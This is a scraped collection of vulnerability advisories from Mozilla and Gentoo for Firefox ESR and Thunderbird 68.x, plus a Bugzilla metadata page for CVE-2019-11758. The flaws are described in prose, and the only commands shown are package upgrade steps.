An attacker could have caused 4 bytes of HMAC output to be written past the end of a buffer stored on the stack. This could be used by an attacker to execute arbitrary code or more likely lead to a crash.

##### References

* [Bug 1577953](https://bugzilla.mozilla.org/show_bug.cgi?id=1577953)

#### [#CVE-2019-11760: Stack buffer overflow in WebRTC networking](#CVE-2019-11760)

Reporter
Nils
Impact
moderate
##### Description

A fixed-size stack buffer could overflow in nrappkit when doing WebRTC signaling. This resulted in a potentially exploitable crash in some instances.

##### References

* [Bug 1577719](https://bugzilla.mozilla.org/show_bug.cgi?id=1577719)

#### [#CVE-2019-11761: Unintended access to a privileged JSONView object](#CVE-2019-11761)

Reporter
Cody Crews
Impact
moderate
##### Description

By using a form with a data URI it was possible to gain access to the privileged `JSONView` object that had been cloned into content. Impact from exposing this object appears to be minimal, however it was a bypass of existing defense in depth mechanisms.

##### References

* [Bug 1561502](https://bugzilla.mozilla.org/show_bug.cgi?id=1561502)

#### [#CVE-2019-11762: document.domain-based origin isolation has same-origin-property violation](#CVE-2019-11762)

Reporter
Kris Maglione
Impact
moderate
##### Description

If two same-origin documents set document.domain differently to become cross-origin, it was possible for them to call arbitrary DOM methods/getters/setters on the now-cross-origin window.

##### References

* [Bug 1582857](https://bugzilla.mozilla.org/show_bug.cgi?id=1582857)

#### [#CVE-2019-11763: Incorrect HTML parsing results in XSS bypass technique](#CVE-2019-11763)

Reporter
Gareth Heyes
Impact
moderate
##### Description

Failure to correctly handle null bytes when processing HTML entities resulted in Firefox incorrectly parsing these entities. This could have led to HTML comment text being treated as HTML which could have led to XSS in a web application under certain conditions. It could have also led to HTML entities being masked from filters - enabling the use of entities to mask the actual characters of interest from filters.

##### References

* [Bug 1584216](https://bugzilla.mozilla.org/show_bug.cgi?id=1584216)

#### [#CVE-2019-11764: Memory safety bugs fixed in Thunderbird 68.2](#CVE-2019-11764)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Bob Clary, Jason Kratzer, Aaron Klotz, Iain Ireland, Tyson Smith, Christian Holler, Steve Fink, Honza Bambas, Byron Campen, and Cristian Brindusan reported memory safety bugs present in Firefox 69 and Firefox ESR 68.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1558522%2C1577061%2C1548044%2C1571223%2C1573048%2C1578933%2C1575217%2C1583684%2C1586845%2C1581950%2C1583463%2C1586599)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from security.gentoo.org_44adb626_20250121_000032.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Thunderbird: Multiple vulnerabilities — GLSA **202003-10**

Multiple vulnerabilities have been found in Mozilla Thunderbird,
the worst of which could result in the arbitrary execution of code.

### Affected packages

| Package | **mail-client/thunderbird** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

| Package | **mail-client/thunderbird-bin** on all architectures |
| --- | --- |
| Affected versions | < **68.6.0** |
| Unaffected versions | >= **68.6.0** |

### Background

Mozilla Thunderbird is a popular open-source email client from the
Mozilla project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Thunderbird.
Please review the CVE identifiers referenced below for details.

### Impact

A remote attacker may be able to execute arbitrary code, cause a Denial
of Service condition, obtain sensitive information, or conduct Cross-Site
Request Forgery (CSRF).

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Thunderbird users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=mail-client/thunderbird-68.6.0"

```

All Mozilla Thunderbird binary users should upgrade to the latest
version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=mail-client/thunderbird-bin-68.6.0"

```
### References

* [MFSA-2019-35](https://www.mozilla.org/en-US/security/advisories/mfsa2019-35/)
* [MFSA-2019-37](https://www.mozilla.org/en-US/security/advisories/mfsa2019-37/)
* [MFSA-2020-07](https://www.mozilla.org/en-US/security/advisories/mfsa2020-07/)
* [MFSA-2020-10](https://www.mozilla.org/en-US/security/advisories/mfsa2020-10/)
* [CVE-2019-11745](https://nvd.nist.gov/vuln/detail/CVE-2019-11745)
* [CVE-2019-11757](https://nvd.nist.gov/vuln/detail/CVE-2019-11757)
* [CVE-2019-11759](https://nvd.nist.gov/vuln/detail/CVE-2019-11759)
* [CVE-2019-11760](https://nvd.nist.gov/vuln/detail/CVE-2019-11760)
* [CVE-2019-11761](https://nvd.nist.gov/vuln/detail/CVE-2019-11761)
* [CVE-2019-11762](https://nvd.nist.gov/vuln/detail/CVE-2019-11762)
* [CVE-2019-11763](https://nvd.nist.gov/vuln/detail/CVE-2019-11763)
* [CVE-2019-11764](https://nvd.nist.gov/vuln/detail/CVE-2019-11764)
* [CVE-2019-17005](https://nvd.nist.gov/vuln/detail/CVE-2019-17005)
* [CVE-2019-17008](https://nvd.nist.gov/vuln/detail/CVE-2019-17008)
* [CVE-2019-17010](https://nvd.nist.gov/vuln/detail/CVE-2019-17010)
* [CVE-2019-17011](https://nvd.nist.gov/vuln/detail/CVE-2019-17011)
* [CVE-2019-17012](https://nvd.nist.gov/vuln/detail/CVE-2019-17012)
* [CVE-2019-20503](https://nvd.nist.gov/vuln/detail/CVE-2019-20503)
* [CVE-2020-6792](https://nvd.nist.gov/vuln/detail/CVE-2020-6792)
* [CVE-2020-6793](https://nvd.nist.gov/vuln/detail/CVE-2020-6793)
* [CVE-2020-6794](https://nvd.nist.gov/vuln/detail/CVE-2020-6794)
* [CVE-2020-6795](https://nvd.nist.gov/vuln/detail/CVE-2020-6795)
* [CVE-2020-6798](https://nvd.nist.gov/vuln/detail/CVE-2020-6798)
* [CVE-2020-6800](https://nvd.nist.gov/vuln/detail/CVE-2020-6800)
* [CVE-2020-6805](https://nvd.nist.gov/vuln/detail/CVE-2020-6805)
* [CVE-2020-6806](https://nvd.nist.gov/vuln/detail/CVE-2020-6806)
* [CVE-2020-6807](https://nvd.nist.gov/vuln/detail/CVE-2020-6807)
* [CVE-2020-6811](https://nvd.nist.gov/vuln/detail/CVE-2020-6811)
* [CVE-2020-6812](https://nvd.nist.gov/vuln/detail/CVE-2020-6812)
* [CVE-2020-6814](https://nvd.nist.gov/vuln/detail/CVE-2020-6814)

**Release date**

March 14, 2020

**Latest revision**

March 14, 2020: 1

**Severity**

high

**Exploitable**

remote

**Bugzilla entries**

* [698516](https://bugs.gentoo.org/show_bug.cgi?id=698516)
* [702638](https://bugs.gentoo.org/show_bug.cgi?id=702638)
* [709350](https://bugs.gentoo.org/show_bug.cgi?id=709350)
* [712518](https://bugs.gentoo.org/show_bug.cgi?id=712518)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.mozilla.org_29aa784c_20250121_000033.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2019-33

## Security vulnerabilities fixed in - Firefox ESR 68.2

Announced
October 22, 2019
Impact
critical
Products
Firefox ESR
Fixed in

* Firefox ESR 68.2

#### [#CVE-2019-15903: Heap overflow in expat library in XML\_GetCurrentLineNumber](#CVE-2019-15903)

Reporter
Sebastian Pipping
Impact
high
##### Description

In libexpat before 2.2.8, crafted XML input could fool the parser into changing from DTD parsing to document parsing too early. A subsequent call to `XML_GetCurrentLineNumber` or `XML_GetCurrentColumnNumber` then resulted in a heap-based buffer over-read.

##### References

* [Bug 1584907](https://bugzilla.mozilla.org/show_bug.cgi?id=1584907)

#### [#CVE-2019-11757: Use-after-free when creating index updates in IndexedDB](#CVE-2019-11757)

Reporter
Zhanjia Song
Impact
high
##### Description

When following the value's prototype chain, it was possible to retain a reference to a locale, delete it, and subsequently reference it. This resulted in a use-after-free and a potentially exploitable crash.

##### References

* [Bug 1577107](https://bugzilla.mozilla.org/show_bug.cgi?id=1577107)

#### [#CVE-2019-11758: Potentially exploitable crash due to 360 Total Security](#CVE-2019-11758)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla community member Philipp reported a memory safety bug present in Firefox 68 when 360 Total Security was installed. This bug showed evidence of memory corruption in the accessibility engine and we presume that with enough effort that it could be exploited to run arbitrary code.

##### References

* [Bug 1536227](https://bugzilla.mozilla.org/show_bug.cgi?id=1536227)

#### [#CVE-2019-11759: Stack buffer overflow in HKDF output](#CVE-2019-11759)

Reporter
Guido Vranken
Impact
moderate
##### Description

An attacker could have caused 4 bytes of HMAC output to be written past the end of a buffer stored on the stack. This could be used by an attacker to execute arbitrary code or more likely lead to a crash.

##### References

* [Bug 1577953](https://bugzilla.mozilla.org/show_bug.cgi?id=1577953)

#### [#CVE-2019-11760: Stack buffer overflow in WebRTC networking](#CVE-2019-11760)

Reporter
Nils
Impact
moderate
##### Description

A fixed-size stack buffer could overflow in nrappkit when doing WebRTC signaling. This resulted in a potentially exploitable crash in some instances.

##### References

* [Bug 1577719](https://bugzilla.mozilla.org/show_bug.cgi?id=1577719)

#### [#CVE-2019-11761: Unintended access to a privileged JSONView object](#CVE-2019-11761)

Reporter
Cody Crews
Impact
moderate
##### Description

By using a form with a data URI it was possible to gain access to the privileged `JSONView` object that had been cloned into content. Impact from exposing this object appears to be minimal, however it was a bypass of existing defense in depth mechanisms.

##### References

* [Bug 1561502](https://bugzilla.mozilla.org/show_bug.cgi?id=1561502)

#### [#CVE-2019-11762: document.domain-based origin isolation has same-origin-property violation](#CVE-2019-11762)

Reporter
Kris Maglione
Impact
moderate
##### Description

If two same-origin documents set document.domain differently to become cross-origin, it was possible for them to call arbitrary DOM methods/getters/setters on the now-cross-origin window.

##### References

* [Bug 1582857](https://bugzilla.mozilla.org/show_bug.cgi?id=1582857)

#### [#CVE-2019-11763: Incorrect HTML parsing results in XSS bypass technique](#CVE-2019-11763)

Reporter
Gareth Heyes
Impact
moderate
##### Description

Failure to correctly handle null bytes when processing HTML entities resulted in Firefox incorrectly parsing these entities. This could have led to HTML comment text being treated as HTML which could have led to XSS in a web application under certain conditions. It could have also led to HTML entities being masked from filters - enabling the use of entities to mask the actual characters of interest from filters.

##### References

* [Bug 1584216](https://bugzilla.mozilla.org/show_bug.cgi?id=1584216)

#### [#CVE-2019-11764: Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](#CVE-2019-11764)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Bob Clary, Jason Kratzer, Aaron Klotz, Iain Ireland, Tyson Smith, Christian Holler, Steve Fink, Honza Bambas, Byron Campen, and Cristian Brindusan reported memory safety bugs present in Firefox 69 and Firefox ESR 68.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 70 and Firefox ESR 68.2](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1558522%2C1577061%2C1548044%2C1571223%2C1573048%2C1578933%2C1575217%2C1583684%2C1586845%2C1581950%2C1583463%2C1586599)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_1b6daf60_20250121_020902.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1536227)
* [XML](/show_bug.cgi?ctype=xml&id=1536227)

Closed
[Bug 1536227](/show_bug.cgi?id=1536227)
(CVE-2019-11758)

Opened 6 years ago
Closed 6 years ago

# Crash in [@ nsTArray\_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl\*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Crash in [@ nsTArray\_Impl<T>::RemoveElement<T>(class `anonymous namespace'::ParentImpl\*& const, const class nsDefaultComparator<T>& const) | mozilla::a11y::DocAccessibleParent::RecvHideEvent]

## Categories

### (Core :: Disability Access APIs, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Disability%20Access%20APIs#Disability%20Access%20APIs)

Disability Access APIs
▾

Core :: Disability Access APIs
Description: This component relates to bugs in our support for accessibility APIs on the various platforms. Accessibility APIs allow 3rd party products, such as screen readers used by visually impaired users, to communicate with our content and UI. The APIs we support specifically are MSAA on Windows and
ATK on UNIX/Linux (Apple has not yet published specs for an accessibility API on OS X). This component is not for keyboard, focus or any accessibility bugs other than those relating to the APIs we export.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Disability%20Access%20APIs&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Disability%20Access%20APIs&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Disability%20Access%20APIs)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

63 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

x86\_64

Windows

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla70

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Webcompat Score | --- |
| --- | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr60 | --- | [unaffected](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=unaffected) |
| firefox-esr68 | [70+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=70%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=verified) |
| firefox66 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox66&o1=equals&v1=wontfix) |
| firefox67 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox67&o1=equals&v1=wontfix) |
| firefox68 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix) |
| firefox69 | [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=verified) |
| firefox70 | [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr60 |  | unaffected |
| firefox-esr68 | 70+ | verified |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox66 |  | wontfix |
| firefox67 |  | wontfix |
| firefox68 |  | wontfix |
| firefox69 | + | verified |
| firefox70 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: philipp, Assigned: Jamie)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/749580f8bd5af77c57367e6c2717e283?d=mm&size=40)  [Jamie](/user_profile?user_id=219126)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/3c7706fb156c53ce5f3aabc0ca897079?d=mm&size=40)  [philipp](/user_profile?user_id=209011)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/5405533dede5f504c103ccd0627c568b?d=mm&size=40)  [ayeddi](/user_profile?user_id=699708)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

16 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (5 keywords, Whiteboard: [adv-main69+][adv-esr68.2-rollup])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2019-11758

[Keywords:](/describekeywords.cgi)

[crash](/buglist.cgi?keywords=crash&resolution=---),
[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[csectype-wildptr](/buglist.cgi?keywords=csectype-wildptr&resolution=---),
[regression](/buglist.cgi?keywords=regression&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main69+][adv-esr68.2-rollup]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

